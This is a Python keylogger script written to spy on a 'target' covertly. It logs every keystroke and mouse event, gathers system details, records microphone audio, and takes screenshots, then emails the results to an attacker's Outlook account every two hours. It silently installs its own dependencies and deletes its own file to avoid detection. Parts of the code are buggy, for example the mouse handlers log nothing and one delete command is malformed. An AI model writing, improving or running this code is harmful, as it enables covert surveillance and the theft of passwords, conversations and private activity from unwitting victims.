#!/usr/bin/python3

try:
    import logging
    import os
    import platform
    import smtplib
    import ssl
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    import imghdr
    from pynput.keyboard import Listener
    from email.message import EmailMessage
    from io import BytesIO
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot","sounddevice","pynput","imghdr"]
    call("pip install " + ' '.join(modules), shell=True)


finally:
    # To connect to server and email
    def sendEmail(message):
        port = 587  # For SSL
        smtp_server = "smtp-mail.outlook.com" # smtp server protocol for an email service
        sender_email = "example@outlook.com"
        password = "password"
        receiver_email = "example@outlook.com"

        # Create a secure SSL context
        context = ssl.create_default_context()

        try:
            server = smtplib.SMTP(smtp_server, port)
            server.ehlo() # Can be omitted
            server.starttls(context=context) # Secure the connection
            server.ehlo() # Can be omitted
            server.login(sender_email, password) # To log in to the server as sender
            server.sendmail(sender_email, receiver_email,message) # Send email here

        except Exception as e:
            print(e)
        finally:
            server.quit()
            

    SEND_REPORT_EVERY = 2 * 60 * 60 # 2 hours in seconds
    class KeyLogger:
        def __init__(self, time_interval):
            self.interval = time_interval
            self.log = "KeyLogger Started..."

        def appendlog(self, string):
            self.log = self.log + string # To update the log

        def on_move(self, x, y):
            current_move = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_move)

        def on_click(self, x, y):
            current_click = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_click)

        def on_scroll(self, x, y):
            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_scroll)

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.appendlog(current_key)            

        # To report keyboard and mouse activity
        def report(self):
            msg = 'Subject: {}\n\n{}'.format("Log Report", self.log)
            sendEmail(msg)
            self.log = ""

            threading.Timer(self.interval, self.report).start()

        # To report System Information
        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog("\n" + hostname)
            self.appendlog(" " + ip)
            self.appendlog(" " + plat)
            self.appendlog(" " + system)
            self.appendlog(" " + machine)
            
            msg = 'Subject: {}\n\n{}'.format("Log Report - System Information", self.log)
            sendEmail(msg)
            self.log = ""

        # To report microphone data
        def microphone(self):
            fs = 44100
            sd.default.samplerate = fs
            sd.default.channels = 2
            myrecording = sd.rec(int(self.interval * fs),blocking=True)
            with wave.open('sound.mp3', 'wb') as obj:
                obj.setnchannels(1)  # mono
                obj.setsampwidth(2)
                obj.setframerate(fs)
                obj.writeframes(myrecording.tobytes())

            msg = EmailMessage()
            msg['Subject'] = "Log Report - Microphone Data"
            with open('sound.mp3','rb') as a:
                data = a.read()
            msg.add_attachment(data, maintype='audio', subtype='mp3')
            sendEmail(msg.as_string())

            threading.Timer(self.interval, self.microphone).start()

        #To report screen sctivity
        def screenshot(self):
            img = pyscreenshot.grab()
            b = BytesIO()
            img.save(b,'png')
            b.seek(0)
            with open('temp.png','wb') as im:
                im.write(b.getbuffer())

            msg = EmailMessage()
            msg['Subject'] = "Log Report - Screenshot"
            with open('temp.png','rb') as t:
                image_data = t.read()

            msg.set_content("Image attached")
            msg.add_attachment(image_data,maintype='image',subtype=imghdr.what(None, image_data))
            sendEmail(msg.as_string())

            threading.Timer(self.interval, self.screenshot).start()

        # To start reporting
        def start(self):
            self.system_information()
            keyboard_listener = Listener(on_press=self.save_data)
            mouse_listener = Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll)
            keyboard_listener.start()
            mouse_listener.start()

            threading.Thread(target=self.screenshot).start()
            threading.Thread(target=self.microphone).start()
            threading.Thread(target=self.report).start()

        # To run all the functions
        def run(self):
            self.start()

            # To delete the program file if the target finds it somehow
            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("DEL " + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system('pkill leafpad')
                    os.system("chattr -i " +  os.path.basename(__file__))
                    print('File was closed.')
                    os.system("rm -rf" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

    # Main
    if __name__ == '__main__':
        keylogger = KeyLogger(SEND_REPORT_EVERY)
        keylogger.run()
